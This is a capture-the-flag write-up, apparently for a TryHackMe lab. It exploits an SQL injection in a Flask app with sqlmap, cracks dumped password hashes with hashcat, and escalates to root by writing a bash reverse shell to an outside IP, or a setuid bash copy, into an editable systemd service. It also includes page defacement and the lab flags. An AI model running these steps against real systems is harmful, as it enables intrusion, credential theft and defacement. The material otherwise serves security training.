# PORT SCAN
---


| PORT | SERVICE |
| :--- | :------ |
| 22   | SSH     |
| 80   | HTTP    |



# RECONNAISSANCE
---

First of all, we can download a task file containing a message from Billy Joel:

![Pasted image 20250609131337.png](../../IMAGES/Pasted%20image%2020250609131337.png)


Now, let's proceed to check the website:


![Pasted image 20250609131510.png](../../IMAGES/Pasted%20image%2020250609131510.png)

Let's fuzz:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.38.213/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.38.213/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

contact                 [Status: 200, Size: 6906, Words: 2319, Lines: 163, Duration: 544ms]
static                  [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 177ms]
index                   [Status: 200, Size: 8541, Words: 2138, Lines: 234, Duration: 865ms]
login                   [Status: 200, Size: 4980, Words: 1497, Lines: 132, Duration: 1276ms]
products                [Status: 200, Size: 7254, Words: 2103, Lines: 177, Duration: 1604ms]
requirements.txt        [Status: 200, Size: 258, Words: 1, Lines: 16, Duration: 235ms]
```


The products section seems odd, if we check it out with a non existant product, this happens:

![Pasted image 20250609132109.png](../../IMAGES/Pasted%20image%2020250609132109.png)

I was thinking of IDOR but couldn't get anything out of it, back at the fuzzing scan, we got `requirements.txt`, let's check it out:

![Pasted image 20250609132816.png](../../IMAGES/Pasted%20image%2020250609132816.png)

We are dealing with flask, we can try fuzzing again but with a python extension to check if we can get `app.py`:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.38.213/FUZZ" -ic -c -t 200 -e .php,.html,.txt,.git,.js,.py

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.38.213/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .php .html .txt .git .js .py
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

                        [Status: 200, Size: 8541, Words: 2138, Lines: 234, Duration: 331ms]
index                   [Status: 200, Size: 8541, Words: 2138, Lines: 234, Duration: 432ms]
static                  [Status: 301, Size: 194, Words: 7, Lines: 8, Duration: 179ms]
app.py                  [Status: 200, Size: 2371, Words: 267, Lines: 82, Duration: 178ms]
```

There it is, let's download it and perform analysis on it:

![Pasted image 20250609133120.png](../../IMAGES/Pasted%20image%2020250609133120.png)

In this exact part of the code, we can find this:

```python
def product(product_id):
    with eng.connect() as con:
        # Executes the SQL Query
        # This should be the vulnerable portion of the application
        rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
        product_selected = rs.fetchone()  # Returns the entire row in a list
    return render_template('product.html', title=product_selected[1], result=product_selected)
```


The vulnerable section is:

```python
rs = con.execute(f"SELECT * FROM product WHERE id={product_id}")
```

This line directly interpolates `product_id` into an SQL query **without sanitization or parameterization**, making it susceptible to SQL injection via the `/products/<product_id>` endpoint.

Knowing this, we can proceed to exploitation.



# EXPLOITATION
---


Since we know SQLI is on the `products` section, we can use sqlmap to automate the exploitation process:

```
sqlmap -u "http://IP/products/1" --dbs --batch --level=5 --risk=3
```


We find the following databases:

```python
available databases [5]:
[*] duckyinc
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
```


Let's read the duckyinc one:

```
sqlmap -u "http://10.10.38.213/products/1" -D duckyinc --dump --batch
```

![Pasted image 20250609134256.png](../../IMAGES/Pasted%20image%2020250609134256.png)

We got our first flag: 

```
thm{br3ak1ng_4nd_3nt3r1ng}
```


![Pasted image 20250609134438.png](../../IMAGES/Pasted%20image%2020250609134438.png)

We got some hashes, we can try getting them and cracking them with hashcat:

```
$2a$08$GPh7KZcK2kNIQEm5byBj1umCQ79xP.zQe19hPoG/w2GoebUtPfT8a
$2a$12$LEENY/LWOfyxyCBUlfX8Mu8viV9mGUse97L8x.4L66e9xwzzHfsQa
$2a$12$22xS/uDxuIsPqrRcxtVmi.GR2/xh0xITGdHuubRF4Iilg5ENAFlcK
```

Now:

```
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![Pasted image 20250609134802.png](../../IMAGES/Pasted%20image%2020250609134802.png)

This is the password for the `server-admin` user:

```
server-admin:inuyasha
```


Let's go into ssh:

```
ssh server-admin@10.10.38.213
```


![Pasted image 20250609134933.png](../../IMAGES/Pasted%20image%2020250609134933.png)
Now, we can begin privilege escalation.


# PRIVILEGE ESCALATION
---

Let's check our sudo privileges first:

```
server-admin@duckyinc:~$ sudo -l
[sudo] password for server-admin:
Matching Defaults entries for server-admin on duckyinc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User server-admin may run the following commands on duckyinc:
    (root) /bin/systemctl start duckyinc.service, /bin/systemctl enable duckyinc.service, /bin/systemctl restart duckyinc.service, /bin/systemctl daemon-reload, sudoedit
        /etc/systemd/system/duckyinc.service
```

So, we can edit the `/etc/systemd/system/duckyinc.service`, let's take a look at the service:

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=flask-app
Group=www-data
WorkingDirectory=/var/www/duckyinc
ExecStart=/usr/local/bin/gunicorn --workers 3 --bind=unix:/var/www/duckyinc/duckyinc.sock --timeout 60 -m 007 app:app
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

We can modify the service using `sudoedit`, let's do it:

```
sudoedit /etc/systemd/system/duckyinc.service
```

Now, we can either modify the service to spawn a reverse shell or a shell directly:

```
ExecStart=/bin/bash -i >& /dev/tcp/10.14.21.28/9001 0>&1
```

Or:

```
ExecStart=/bin/bash /tmp/shell.sh
```

We need to modify the file in the following way:

```
[Unit]
Description=Gunicorn instance to serve DuckyInc Webapp
After=network.target

[Service]
User=root
Group=root
WorkingDirectory=/var/www/duckyinc
ExecStart=/bin/bash -i >& /dev/tcp/IP/9001 0>&1
ExecReload=/bin/kill -s HUP $MAINPID
ExecStop=/bin/kill -s TERM $MAINPID

[Install]
WantedBy=multi-user.target
```

If we follow the direct shell path, we need to create a file with the following contents:

```bash
cp /bin/bash /tmp/sh
chmod +s /tmp/sh
```

Now, let's restart the service:

```
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart duckyinc.service
```

If we check `/tmp` directory:

![Pasted image 20250609142735.png](../../IMAGES/Pasted%20image%2020250609142735.png)
As seen, we got the `sh` binary, let's run it to get a root shell:

![Pasted image 20250609142853.png](../../IMAGES/Pasted%20image%2020250609142853.png)

Now, let's get second flag and root flag:

```
sh-4.4# cat /home/server-admin/flag2.txt
thm{4lm0st_th3re}
```

```
sh-4.4# ls -la /root
total 52
drwx------  7 root root 4096 Aug 28  2020 .
drwxr-xr-x 24 root root 4096 Aug  9  2020 ..
drwxr-xr-x  2 root root 4096 Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12  2020 .bashrc
drwx------  3 root root 4096 Aug  9  2020 .cache
drwx------  3 root root 4096 Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4096 Aug  9  2020 .ssh
-rw-------  1 root root 7763 Aug 12  2020 .viminfo
```

As seen, inside of the root directory, we can't find the flag, this is because we must follow what it said inside of the message at the start of the room, we need to perform defacement on the page, let's do it:

```
nano /var/www/duckyinc/templates/index.html
```

![Pasted image 20250609143131.png](../../IMAGES/Pasted%20image%2020250609143131.png)

Once we modify the file, our root directory changes:

```
sh-4.4# ls -la /root
total 56
drwx------  7 root root 4096 Jun  9 19:31 .
drwxr-xr-x 24 root root 4096 Aug  9  2020 ..
drwxr-xr-x  2 root root 4096 Aug 12  2020 .bash_completion.d
lrwxrwxrwx  1 root root    9 Aug 10  2020 .bash_history -> /dev/null
-rw-r--r--  1 root root 3227 Aug 12  2020 .bashrc
drwx------  3 root root 4096 Aug  9  2020 .cache
-rw-r--r--  1 root root   26 Jun  9 19:31 flag3.txt
drwx------  3 root root 4096 Aug  9  2020 .gnupg
drwxr-xr-x  5 root root 4096 Aug 12  2020 .local
-rw-------  1 root root  485 Aug 10  2020 .mysql_history
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   66 Aug 10  2020 .selected_editor
drwx------  2 root root 4096 Aug  9  2020 .ssh
-rw-------  1 root root 7763 Aug 12  2020 .viminfo
```

We can now get our flag:

```
sh-4.4# cat /root/flag3.txt
thm{m1ss10n_acc0mpl1sh3d}
```

![Pasted image 20250609143240.png](../../IMAGES/Pasted%20image%2020250609143240.png)

